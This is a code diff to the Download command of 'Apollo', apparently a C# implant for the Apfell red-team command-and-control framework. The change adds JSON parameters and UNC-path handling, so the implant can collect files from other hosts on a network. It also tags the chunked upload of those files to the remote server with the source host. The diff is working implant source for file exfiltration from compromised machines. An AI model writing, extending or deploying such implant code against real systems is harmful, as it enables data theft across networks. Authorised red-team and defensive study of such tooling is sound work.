@@ -23,6 +23,11 @@ namespace Apollo.CommandModules
 {
     public class Download
     {
+        public struct DownloadParameters
+        {
+            public string file;
+            public string host;
+        }
         /// <summary>
         /// Download a file to the remote Apfell server.
         /// </summary>
@@ -34,13 +39,38 @@ namespace Apollo.CommandModules
         public static void Execute(Job job, Agent implant)
         {
             Task task = job.Task;
-            string filepath = task.parameters.Trim();
-            string strReply;
-            bool uploadResponse;
-            if (filepath[0] == '"' && filepath[filepath.Length - 1] == '"')
-                filepath = filepath.Substring(1, filepath.Length - 2);
-            else if (filepath[0] == '\'' && filepath[filepath.Length - 1] == '\'')
-                filepath = filepath.Substring(1, filepath.Length - 2);
+            DownloadParameters dlParams;
+            string filepath = "";
+            string host = "";
+            string computerName = "";
+            try
+            {
+                computerName = Environment.GetEnvironmentVariable("COMPUTERNAME");
+            } catch { }
+            try
+            {
+                dlParams = JsonConvert.DeserializeObject<DownloadParameters>(task.parameters);
+            } catch (Exception ex)
+            {
+                job.SetError($"Failed to deserialize ");
+                return;
+            }
+            host = dlParams.host;
+            if (host != "")
+            {
+                if (host.ToLower() != "localhost" && host != "127.0.0.1" && host != "." && host != "::::" && host.ToLower() != computerName.ToLower())
+                {
+                    filepath = $"\\\\{host}\\{dlParams.file}";
+                } else
+                {
+                    filepath = dlParams.file;
+                    host = computerName;
+                }
+            } else
+            {
+                filepath = dlParams.file;
+                host = computerName;
+            }
             try // Try block for file upload task
             {
                 // Get file info to determine file size
@@ -59,7 +89,8 @@ namespace Apollo.CommandModules
                 {
                     task_id = task.id,
                     total_chunks = total_chunks,
-                    full_path = fileInfo.FullName
+                    full_path = fileInfo.FullName,
+                    host = host
                 };
 
                 job.AddOutput(registrationMessage);
